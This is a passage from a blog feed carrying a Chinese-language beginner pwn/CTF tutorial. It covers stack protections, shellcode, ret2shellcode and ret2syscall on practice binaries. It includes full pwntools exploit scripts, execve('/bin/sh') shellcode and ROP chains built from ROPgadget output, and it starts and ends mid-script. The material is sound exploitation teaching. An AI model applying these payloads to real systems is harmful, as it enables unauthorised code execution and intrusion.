debug()</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span><br>payload += p64(pop_rdi) + p64(binsh)<br>payload += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0</span>)<br>payload += p64(execve)<br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">&quot;So, Bye?&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn入门系列（二）</title>
    <link href="/post/10828.html"/>
    <url>/post/10828.html</url>
    
    <content type="html"><![CDATA[<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><p>shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>通常情况下，shellcode 需要我们自行编写，即此时我们需要自行向内存中填充一些可执行的代码</strong>。</p><h2 id="shellcode例题"><a href="#shellcode例题" class="headerlink" title="shellcode例题"></a>shellcode例题</h2><p>checksec检查程序的保护机制，大部分保护都没开，这里我们主要关注NX保护</p><img src="/post/10828/1731743811985-867299b7-0d83-4047-8978-623eff9b410e.png" class="" title="img"><p>保护机制的一些介绍：</p><ul><li><p><strong>RELRO（RELocation Read-Only）</strong>：RELRO 是一种技术，用于在执行文件时将一部分重定位信息标记为只读，以防止恶意利用。RELRO 提供了一种机制，确保某些重定位表项在程序运行时不可修改，从而增加了程序的安全性。</p></li><li><p><strong>Stack Protection（栈保护）</strong>：栈保护技术旨在防止缓冲区溢出攻击。其中包括一些技术，如堆栈保护（Stack Smashing Protection，SSP）和堆栈随机化（Stack Randomization），用于检测和阻止对函数返回地址等关键数据的修改。</p></li><li><p><strong>NX（No eXecute）</strong>：NX 是一种硬件级别的技术，用于防止数据区域被当作指令区域执行，从而有效防止针对缓冲区溢出的攻击，如 shellcode 注入。</p></li><li><p><strong>PIE（Position Independent Executable）</strong>：PIE 是一种技术，使得程序的加载地址在每次执行时都是随机的，这样可以有效防止攻击者利用已知的内存地址信息来执行攻击。</p></li></ul><p>接下来我们在ida中打开程序，当我们按下F5之后并没有跳转到伪代码界面而是给出了警告</p><img src="/post/10828/1731743812050-61ef9f19-507b-4152-a6e0-d540251b39bd.png" class="" title="img"><p>这个警告实际上由于程序出现了一些ida无法解析的指令，即<code>call rdx</code>这条指令</p><img src="/post/10828/1731743812117-e34fad5e-27f5-4c72-8250-bcb0a3378ea4.png" class="" title="img"><p>下面介绍如何解决这个问题</p><p>在菜单栏点击<strong>Edit</strong>，接着找到<strong>Patch program</strong>，然后选择<strong>Assemble…</strong></p><img src="/post/10828/1731743812190-d13e3533-569b-4e80-99a2-822253b5cb7d.png" class="" title="img"><p>这时会跳出一个窗口，我们需要修改Assembly这一栏</p><img src="/post/10828/1731743812257-2036e11d-fd33-4172-a899-6bd053adc905.png" class="" title="img"><p>我们将rdx改为rcx，然后按下回车，可以发现此时<code>call rdx</code>已经变成<code>call rcx</code></p><img src="/post/10828/1731743812361-9655fd44-559d-4d58-b607-3aca70285b6d.png" class="" title="img"><p>之后我们再按下F5就会跳转到伪代码界面</p><p>我们可以看到，main函数的逻辑很清晰。我们发现read函数读入了0x100字节，而字符数组buf距离rbp却是0x110，这显然不能造成溢出。我们还注意到了<code>v3(0LL, buf, buf)</code>这条语句，这条语句实际是通过一个指针来调用了一个函数，实现的效果是允许执行任意用户输入的代码。那么如果我们将汇编代码写到buf中，然后利用这个指针就可以获取到控制权</p><img src="/post/10828/1731743812439-d45975d6-2688-4372-968b-c960bfbbe5fa.png" class="" title="img"><p>接下来我们使用gdb进行调试</p><p>直接输入start</p><img src="/post/10828/1731743812495-186bdde3-954e-4266-bd8b-b394a3c642c5.png" class="" title="img"><p>接着输入vmmap来查看程序内存布局，可以看到[stack]区域有rwx权限。</p><img src="/post/10828/1731743812568-d0cdd9e8-aabb-410a-9cb6-59459f980bf6.png" class="" title="img"><img src="/post/10828/1731743812633-b2f8bdd5-d14e-4e08-a426-08c59fb27987.png" class="" title="img"><p>我们可以直接利用pwntools库中的shelcraft.sh()直接生成汇编代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>p = process(<span class="hljs-string">&quot;./shellcode&quot;</span>)<br><br><span class="hljs-comment"># attach(p)</span><br>payload = asm(shellcraft.sh())<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>也可以手写汇编代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>p = process(<span class="hljs-string">&quot;./shellcode&quot;</span>)<br><br><span class="hljs-comment"># attach(p)</span><br><span class="hljs-comment">#execve(&#x27;/bin/sh&#x27;, 0, 0)</span><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rbx, 0x68732f6e69622f  #/bin/sh的十六进制：2f 62 69 6e 2f 73 68</span><br><span class="hljs-string">    push rbx</span><br><span class="hljs-string">    mov rdi, rsp               #将/bin/sh赋值给rdi</span><br><span class="hljs-string">    xor rsi, rsi   #将rsi置0相当于mov rsi, 0</span><br><span class="hljs-string">    xor rdx, rdx               #将rdx置0相当于mov rdx, 0</span><br><span class="hljs-string">    mov rax, 59   #将59赋值给rax</span><br><span class="hljs-string">    syscall   #执行系统调用</span><br><span class="hljs-string">  &#x27;&#x27;&#x27;</span>)<br><br>p.sendline(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>执行脚本，成功获取控制</p><img src="/post/10828/1731743812726-030ef62c-5428-46b7-aa46-2780f8f7122e.png" class="" title="img"><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>我们通过调试来看一下脚本的执行流程，选用第二个脚本，然后加入attach调试语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>p = process(<span class="hljs-string">&quot;./shellcode&quot;</span>)<br><br>attach(p)<br><span class="hljs-comment">#execve(&#x27;/bin/sh&#x27;, 0, 0)</span><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rbx, 0x68732f6e69622f  #/bin/sh的十六进制：2f 62 69 6e 2f 73 68</span><br><span class="hljs-string">    push rbx</span><br><span class="hljs-string">    mov rdi, rsp               #将/bin/sh赋值给rdi</span><br><span class="hljs-string">    xor rsi, rsi   #将rsi置0相当于mov rsi, 0</span><br><span class="hljs-string">    xor rdx, rdx               #将rdx置0相当于mov rdx, 0</span><br><span class="hljs-string">    mov rax, 59   #将59赋值给rax</span><br><span class="hljs-string">    syscall   #执行系统调用</span><br><span class="hljs-string">  &#x27;&#x27;&#x27;</span>)<br><br>p.sendline(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>直接运行脚本，然后在调试窗口，输入ni</p><img src="/post/10828/1731743813570-54673aa4-d32e-48ca-a64c-725af9daea56.png" class="" title="img"><p>同时我们注意观察汇编代码部分</p><img src="/post/10828/1731743812802-03fc1015-edca-411b-bdbe-abb44fb7b270.png" class="" title="img"><p>接着我们输入回车，直至程序运行到<code>call rdx</code>处</p><img src="/post/10828/1731743812864-d35c8a71-4a67-4aa2-9f4a-9f6e103118eb.png" class="" title="img"><p>这时我们输入si</p><img src="/post/10828/1731743813637-b56bc930-b60f-4dab-a8ee-d2763a6142a0.png" class="" title="img"><p>我们再查看汇编代码部分，可以看到程序开始执行我们编写的汇编代码</p><img src="/post/10828/1731743812942-1a98cdc2-2d79-4f3d-94e9-51b8959f7624.png" class="" title="img"><h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><p>ret2shellcode是指攻击者需要自己将调用shell的机器码（也称shellcode）注入至内存中，随后利用栈溢出覆写return_address，进而使程序跳转至shellcode所在内存。</p><p>要实现上述目的，就必须在内存中找到一个可写（这允许我们注入shellcode）且可执行（这允许我们执行shellcode）的段，并且需要知道如何修改这些段的内容。不同的程序及操作系统采取的保护措施不尽相同，因此如何注入shellcode也应当灵活选择。</p><h2 id="ret2shellcode例题"><a href="#ret2shellcode例题" class="headerlink" title="ret2shellcode例题"></a>ret2shellcode例题</h2><p>checksec检查程序</p><img src="/post/10828/1731743813017-c5f593af-5083-4002-aae3-a4497d7afd6d.png" class="" title="img"><p>ida打开，可以看到字符数组s距离rbp为0x100字节，而read可以读入0x110字节，因此存在栈溢出。我们还注意到strcpy函数将字符数组复制到了buff中</p><img src="/post/10828/1731743813088-7eff206c-625e-4107-99de-d2d7ee5062a8.png" class="" title="img"><p>我们来查看一下buff，双击buff之后会跳转到汇编代码界面，可以看到buff是位于bss段</p><img src="/post/10828/1731743813175-0e69ebca-78a3-4705-be34-8d3a1503d53c.png" class="" title="img"><p>我们回到main函数，注意到main函数中还调用了mprotect函数。</p><img src="/post/10828/1731743813247-b31fa984-bd7f-4040-b1bd-af581a0cd3a6.png" class="" title="img"><p>在Linux中，mprotect()函数可以用来修改一段指定内存区域的保护属性。</p><p>函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span>   </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mmap.h&gt;</span>   </span><br><span class="hljs-comment">//mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">mprotect</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *start, <span class="hljs-type">size_t</span> len, <span class="hljs-type">int</span> prot)</span>;<br></code></pre></td></tr></table></figure><p>我们双击stdout查看，可以看到其位于bss段。那么显而易见的，mprotect函数将bss开始的0x1000大小的的区域设置为可读可写可执行（7对应的二进制是111，分别对应读、写和执行权限）</p><img src="/post/10828/1731743813306-42c3ee98-9f91-44f6-890c-1408e962ba1f.png" class="" title="img"><p>综上所诉，我们可以将shellcode写到字符数组s中，然后将返回地址修改为buff，这样程序会先将字符数组s复制到buff中，此时buff中就有了shellcode，接着程序执行到返回地址时会返回到buff中，然后程序就会执行buff中的shellcode</p><p>栈布局图如下</p><img src="/post/10828/1731743813390-42fe1ca5-8956-4d8a-9990-47e08554a7b6.png" class="" title="img"><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br><br>buff = <span class="hljs-number">0x4040A0</span><br><br>attach(p)<br>shellcode = asm(shellcraft.sh())<br>shellcode = shellcode.ljust(<span class="hljs-number">0x108</span>, <span class="hljs-string">b&#x27;a&#x27;</span>) + p64(buff)<br>p.send(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>执行exp</p><img src="/post/10828/1731743813496-e2d57552-d479-43c0-bb83-58f5b20ffa2a.png" class="" title="img"><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p><p>系统调用是指由操作系统提供的供所有系统调用的程序接口集合，用户程序通常只在用户态下运行，当用户程序想要调用只能在内核态运行的子程序时，操作系统需要提供访问这些内核态运行的程序的接口，这些接口的集合就叫做系统调用，简要的说，系统调用是内核向用户进程提供服务的唯一方法。</p><h2 id="32-位例题"><a href="#32-位例题" class="headerlink" title="32 位例题"></a>32 位例题</h2><p>checksec 检查程序保护机制，程序开启了 NX 保护</p><img src="/post/10828/1734009466920-66d95d0e-6d52-4c9b-a493-a7a671e82559.png" class="" title="img"><p>此时，我们还可以用 <code>file</code> 命令来查看文件的其他信息；可以看到，这是一个静态链接的程序</p><p>静态链接是由链接器在链接时将库的内容加入到可执行程序中的做法。</p><p>链接器是一个独立程序，将一个或多个库或目标文件（先前由编译器或汇编器生成）链接到一块生成可执行程序。</p><p>简单的讲，静态链接就是在编译时将所有需要的模块（包括库文件）直接编译进可执行文件中。</p><img src="/post/10828/1734009467015-4655c41e-c4ec-4dbc-b3f8-29614c690eca.png" class="" title="img"><p>ida 打开，可以看到在函数这一栏有很多函数，这就是静态链接程序的特征</p><img src="/post/10828/1734009467075-8a362beb-60f3-4a69-ab0e-d540edc20191.png" class="" title="img"><p>我们进入 main 函数，可以看到有 gets 函数，存在栈溢出。当我们再查看其他函数时我们并没有其他收获，即程序中不存在 system(‘&#x2F;bin&#x2F;sh’)，也无法进行 shellcode 利用。</p><img src="/post/10828/1734009467156-11114138-0761-48f1-942f-b23bee45ea6a.png" class="" title="img"><p>我们想要利用这个程序中的漏洞来获取到 shell，就需要利用到系统调用，那么我们先简单了解一下 32 位程序中的一些系统调用知识。</p><p>Linux 在x86上的系统调用通过 int 80h 实现，用系统调用号来区分入口函数。应用程序调用系统调用的过程是：</p><ol><li><p>把系统调用的编号存入 EAX；</p></li><li><p>把函数参数存入其它通用寄存器；</p></li><li><p>触发 0x80 号中断（int 0x80）。</p></li></ol><p>那么我们可以系统调用 execve 函数来获取 shell，execve 函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">execve</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[], <span class="hljs-type">char</span> *<span class="hljs-type">const</span> envp[])</span>;<br></code></pre></td></tr></table></figure><p>我们发现 execve 函数有三个参数，因此我们需要三个寄存器来使得我们能够控制三个参数的值，从而实现以下系统调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>由于我们需要将系统调用号存入 eax 中，所以我们总共需要四个寄存器，所以我们需要使得</p><ul><li><p>系统调用号，即 eax 应该为 0xb</p></li><li><p>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，或者 sh 的地址也可以。</p></li><li><p>第二个参数，即 ecx 应该为 0</p></li><li><p>第三个参数，即 edx 应该为 0</p></li></ul><p>而我们如何控制这些寄存器的值呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p><p>首先，我们来寻找控制 eax 的 gadgets，通过以下命令我们找到一些 eax 的 gadgets，我们选用第二条，即<code>0x080bb196</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary pwn32 --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep eax<br></code></pre></td></tr></table></figure><img src="/post/10828/1734009467230-d54e8a0c-8e5f-4e76-ba7e-849a2afd2237.png" class="" title="img"><p>接着是 ebx 和 ecx，通过以下命令我们找到了<code>0x080481c9 : pop ebx ; ret</code>和<code>0x0806eb91 : pop ecx ; pop ebx ; ret</code>，这里我们选用后者，这个 gadget 可以控制 ecx 和 ebx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary pwn32 --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep ebx<br></code></pre></td></tr></table></figure><img src="/post/10828/1734009467294-08055070-84de-4f59-b4f0-71e0797de082.png" class="" title="img"><p>还有 edx，这里我们选用<code>0x0806eb6a</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary pwn32 --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep edx<br></code></pre></td></tr></table></figure><img src="/post/10828/1734009467357-48ea4416-3870-4ae7-83d3-0e16207adf19.png" class="" title="img"><p>此外，我们需要获得 &#x2F;bin&#x2F;sh 字符串对应的地址，即<code>0x080be408</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary pwn32 --string <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br></code></pre></td></tr></table></figure><img src="/post/10828/1734009467450-00af7682-d545-4ffa-8451-8389dcd809f4.png" class="" title="img"><p>最后是 int 0x80 的地址，即<code>0x08049421</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary pwn32 --only <span class="hljs-string">&#x27;int&#x27;</span><br></code></pre></td></tr></table></figure><img src="/post/10828/1734009467506-9ba2416c-3a27-40a4-ad88-e558555963ad.png" class="" title="img"><p>所有的 gadget 找完之后我们写 exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;i386&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn32&#x27;</span>)<br><br>binsh = <span class="hljs-number">0x080be408</span><br>pop_eax = <span class="hljs-number">0x080bb196</span><br>pop_ecx_ebx = <span class="hljs-number">0x0806eb91</span><span class="hljs-comment">#pop ecx ; pop ebx ; ret</span><br>pop_edx = <span class="hljs-number">0x0806eb6a</span><br>int_0x80 = <span class="hljs-number">0x08049421</span><br><br><span class="hljs-comment">#attach(p, &#x27;b *0x8048EA1&#x27;)</span><br><span class="hljs-comment">#execve(&#x27;/bin/sh&#x27;, 0, 0)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span><br>payload += p32(pop_ecx_ebx) + p32(<span class="hljs-number">0</span>) + p32(binsh)<br>payload += p32(pop_edx) + p32(<span class="hljs-number">0</span>)<br>payload += p32(pop_eax) + p32(<span class="hljs-number">0xb</span>)<br>payload += p32(int_0x80)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>栈布局</p><img src="/post/10828/1734009467572-ee3aae61-36ac-4aa4-9c43-9ce98948e9f8.png" class="" title="img"><p>我们在 exp 中加入语句 attach(p, ‘b *0x8048EA1’)，即将断点下在<code>0x8048EA1</code>处，这个地址是 main 函数的结尾，调试脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;i386&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn32&#x27;</span>)<br><br>binsh = <span class="hljs-number">0x080be408</span><br>pop_eax = <span class="hljs-number">0x080bb196</span><br>pop_ecx_ebx = <span class="hljs-number">0x0806eb91</span><span class="hljs-comment">#pop ecx ; pop ebx ; ret</span><br>pop_edx = <span class="hljs-number">0x0806eb6a</span><br>int_0x80 = <span class="hljs-number">0x08049421</span><br><br>attach(p, <span class="hljs-string">&#x27;b *0x8048EA1&#x27;</span>)<span class="hljs-comment">#调试语句</span><br><span class="hljs-comment">#execve(&#x27;/bin/sh&#x27;, 0, 0)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span><br>payload += p32(pop_ecx_ebx) + p32(<span class="hljs-number">0</span>) + p32(binsh)<br>payload += p32(pop_edx) + p32(<span class="hljs-number">0</span>)<br>payload += p32(pop_eax) + p32(<span class="hljs-number">0xb</span>)<br>payload += p32(int_0x80)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><img src="/post/10828/1734009467699-6b0e820f-2c9e-4d25-8acc-7735c59a2a43.png" class="" title="img"><p>运行脚本开始调试，输入 c 继续运行</p><img src="/post/10828/1734009467787-de036a7b-c01e-4848-b111-1b38963a8a58.png" class="" title="img"><p>我们查看汇编窗口，可以看到是我们写入的内容</p><img src="/post/10828/1734009467851-e7aa4f6f-d3e9-4215-b22a-b7dbad809e31.png" class="" title="img"><p>然后输入 ni，查看汇编窗口，此时 <code>pop ecx</code> 是 eip 即将要执行的汇编代码；查看栈区，此时栈顶 esp 的位置是 0。那么当程序执行了 <code>pop ecx</code> 之后，会将栈顶 esp 位置的 0 赋值给 ecx</p><img src="/post/10828/1734009467911-736f0e8c-69d5-4764-8937-1cb9d437c5ad.png" class="" title="img"><img src="/post/10828/1734009468019-482dc29c-1635-49c6-ab79-e011421b34fe.png" class="" title="img"><p>接着我们输入 ni 或者回车，查看寄存器窗口可以看到 eax 变为 0。</p><img src="/post/10828/1734009468090-44b23787-f0f9-4877-9b28-4c305e441b4f.png" class="" title="img"><p>通过以上的调试，我们就了解了控制寄存器的原理。</p><p>我们再输入 ni 或者或者回车，程序运行到 ret 处，此时第一段 gadgets 将要执行完成，就需要返回，此时返回地址是第二段 gadgets，那么程序就会接着执行第二段 gadgets。这就是通过 gadgets 的 ret 来连续执行 gadgets 的原理</p><img src="/post/10828/1734009468161-0bbe5a71-f874-4844-8dfd-b15fda2757f0.png" class="" title="img"><h2 id="64-位例题"><a href="#64-位例题" class="headerlink" title="64 位例题"></a>64 位例题</h2><p>checksec 检查程序保护机制</p><img src="/post/10828/1734009468227-c588b95d-af8a-4d3f-a148-e23738f33a32.png" class="" title="img"><p>同样使用 file 命令查看，依然是静态链接</p><img src="/post/10828/1734009468298-9f14ff0b-c693-48bc-91ad-6ae5a664dfd2.png" class="" title="img"><p>ida 打开，查看 main 函数，发现有 gets 函数，存在栈溢出</p><img src="/post/10828/1734009468531-c919f3ad-e24e-4c55-a5b1-21fc173597e5.png" class="" title="img"><p>由于是静态链接的程序，且没有 system(‘&#x2F;bin&#x2F;sh’)调用，我们同样考虑使用 ret2syscall 的解法。我们还是需要实现以下系统调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>由于 64 位程序与 32 位程序在保存参数的寄存器有所区别，具体为前六个整型或指针参数依次保存在 RDI, RSI, RDX, RCX, R8 和 R9 寄存器中，如果还有更多的参数的话才会保存在栈上。而且在 64 位中，使用的是 syscall 指令来进行系统调用</p><p>所以我们需要使得</p><ul><li><p>系统调用号，即 rax 应该为 0x3b</p></li><li><p>第一个参数，即 rdi 应该指向 &#x2F;bin&#x2F;sh 的地址，或者 sh 的地址也可以。</p></li><li><p>第二个参数，即 rsi 应该为 0</p></li><li><p>第三个参数，即 rdx 应该为 0</p></li></ul><p>首先寻找 rax，这里选用 <code>0x4bc808</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary pwn64 --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep rax<br></code></pre></td></tr></table></figure><img src="/post/10828/1734009468646-dd3aa790-939b-4df5-925d-79d17157ee1f.png" class="" title="img"><p>接着寻找 rdi，这里选用 <code>0x401626</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary pwn64 --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep rdi<br></code></pre></td></tr></table></figure><img src="/post/10828/1734009468700-8ca3e770-d092-40ef-98e6-3a56e98fd43e.png" class="" title="img"><p>然后是 rsi，这里选用 <code>0x401747</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary pwn64 --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep rsi<br></code></pre></td></tr></table></figure><img src="/post/10828/1734009468763-edfe2a4e-4b3d-4013-a8f7-8f5fa8105d14.png" class="" title="img"><p>再然后是 rdx，这里选用 <code>0x442b66</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary pwn64 --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep rdx<br></code></pre></td></tr></table></figure><img src="/post/10828/1734009468820-4696d093-4de2-4084-b0e6-e6d490662710.png" class="" title="img"><p>此外，我们需要获得 &#x2F;bin&#x2F;sh 字符串对应的地址，即 <code>0x4a1384</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary pwn64 --string <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br></code></pre></td></tr></table></figure><img src="/post/10828/1734009468886-d7731faa-21f7-48c2-a06f-7c2f2486bfe7.png" class="" title="img"><p>最后是 syscall 的地址，即 <code>0x4003da</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary pwn64 --only <span class="hljs-string">&#x27;syscall&#x27;</span><br></code></pre></td></tr></table></figure><img src="/post/10828/1734009468939-fbe8c689-e4e0-4383-89eb-f66c7bb2081a.png" class="" title="img"><p>编写 exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span 